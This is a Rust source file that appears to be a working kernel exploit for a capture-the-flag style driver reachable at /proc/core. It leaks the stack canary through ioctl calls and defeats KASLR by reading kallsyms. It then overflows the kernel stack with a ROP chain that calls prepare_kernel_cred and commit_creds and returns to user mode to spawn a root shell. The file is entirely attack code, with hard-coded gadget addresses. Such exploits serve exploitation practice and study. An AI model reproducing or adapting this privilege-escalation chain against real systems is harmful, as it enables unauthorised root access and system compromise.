#![allow(unused_mut)]
#![allow(unused_imports)]
#![allow(unused_assignments)]
#![allow(overflowing_literals)]
#![allow(unused_variables)]
#![allow(unused_macros)]
use colored::*;
use eval::eval;
use libc::*;
use nix::sys::ioctl;
use std::arch::asm;
use std::fs::File;
use std::io::Read;
use std::process;
use std::process::Command;

macro_rules! log {
    ($s:expr) => {
        println!(
            "[*] {} -> {}",
            stringify!($s).blue(),
            format!("{:x}", $s).yellow()
        );
    };
}
macro_rules! success {
    ($s:expr) => {
        println!("[+] Success: {}", $s.green());
    };
}
macro_rules! info {
    ($s:expr) => {
        println!("[*] Info: {}", $s.purple());
    };
}
macro_rules! error {
    ($s:expr) => {
        println!("[-] Error: {}", $s.red());
        process::exit(-1);
    };
}
macro_rules! open_rw {
    ($s:expr) => {
        nix::fcntl::open($s, nix::fcntl::OFlag::O_RDWR, nix::sys::stat::Mode::empty())
    };
}

static mut USER_CS: u64 = 0;
static mut USER_SS: u64 = 0;
static mut USER_RFLAGS: u64 = 0;
static mut USER_SP: u64 = 0;
fn save_status() {
    unsafe {
        asm!("mov {}, cs", out(reg) USER_CS);
        asm!("mov {}, ss", out(reg) USER_SS);
        asm!("mov {}, rsp", out(reg) USER_SP);
        asm!("pushf");
        asm!("pop {}", out(reg) USER_RFLAGS);
    }
    success!("Status saved.");
}

fn get_shell() {
    info!("Attempting to get root shell now: ");
    if (unsafe { getuid() } == 0) {
        success!("Get root shell.");
        let _ = Command::new("sh").spawn().expect("Getshell failed.").wait();
        process::exit(0);
    }
    error!("Failed to get root shell.");
}

static COMMIT_CREDS_ADDR: u64 = 0xffffffff8109c8e0;
static PREPARE_KERNEL_CRED_ADDR: u64 = 0xffffffff8109cce0;
static mut KASLR_OFF: u64 = 0;
fn get_kaslr_offset() {
    info!("Getting kaslr offset.");
    let mut fd = File::open("/tmp/kallsyms").unwrap();
    let mut contents = String::new();
    fd.read_to_string(&mut contents).unwrap();
    let content_lines = contents.lines();
    for i in content_lines {
        let fields: Vec<_> = i.trim().split(" ").map(|field| field.trim()).collect();
        if fields.len() == 3 && fields[2].starts_with("commit_creds") {
            info!(i);
            unsafe {
                KASLR_OFF = u64::from_str_radix(fields[0], 16).unwrap() - COMMIT_CREDS_ADDR;
                log!(KASLR_OFF);
            }
        } else if fields.len() == 3 && fields[2].starts_with("prepare_kernel_cred") {
            info!(i);
            unsafe {
                assert!(
                    KASLR_OFF
                        == u64::from_str_radix(fields[0], 16).unwrap() - PREPARE_KERNEL_CRED_ADDR
                );
            }
        }
    }
}

type a = fn(i32) -> *mut c_void;
type b = fn(*mut c_void);
fn get_root() {
    let p: u64 = unsafe { PREPARE_KERNEL_CRED_ADDR + KASLR_OFF };
    let c: u64 = unsafe { COMMIT_CREDS_ADDR + KASLR_OFF };
    let f1: a = unsafe { std::mem::transmute(p) };
    let f2: b = unsafe { std::mem::transmute(c) };
    f2(f1(0));
}

fn k_rop() {
    unsafe {
        let pop_rdi_ret = KASLR_OFF + 0xffffffff81000b2f;
        let pop_rsi_ret = KASLR_OFF + 0xffffffff810011d6;
        let pop_rdx_ret = KASLR_OFF + 0xffffffff810a0f49;
        let swapgs_popfq_ret = KASLR_OFF + 0xffffffff81a012da;
        let iretq_ret = KASLR_OFF + 0xffffffff81050ac2;
        let mov_rdirax_jmp_rdx = KASLR_OFF + 0xffffffff8106a6d2;

        let fd = open_rw!("/proc/core").expect("Failed to open core.ko");
        let mut buf: [c_ulong; 0x800] = [0; 0x800];

        info!("Getting canary.");
        ioctl(fd, 0x6677889C, 0x40 as *const c_ulong);
        ioctl(fd, 0x6677889B, buf.as_ptr() as *const c_void);
        let canary = buf[0];
        log!(canary);

        info!("StackOverflow");
        let mut i = 0x40 / 8;
        let mut push = |x| {
            buf[i] = x;
            i += 1;
        };
        push(canary);
        push(0xdeadbeef);

        // Solution 1
        push(get_root as u64);

        // Solution 2
        // push(pop_rdi_ret);
        // push(0);
        // push(PREPARE_KERNEL_CRED_ADDR + KASLR_OFF);
        // push(pop_rdx_ret);
        // push(COMMIT_CREDS_ADDR + KASLR_OFF);
        // push(mov_rdirax_jmp_rdx);

        push(swapgs_popfq_ret);
        push(0);
        push(iretq_ret);
        push(get_shell as u64);
        push(USER_CS);
        push(USER_RFLAGS);
        push(USER_SP);
        push(USER_SS);

        write(fd, buf.as_ptr() as *const c_void, 0x800);
        ioctl(
            fd,
            0x6677889A,
            (0xffffffffffff0000 | 0x100) as *const c_ulong,
        );

        close(fd);
    }
}

fn main() {
    save_status();
    get_kaslr_offset();

    k_rop();

    get_shell();
}
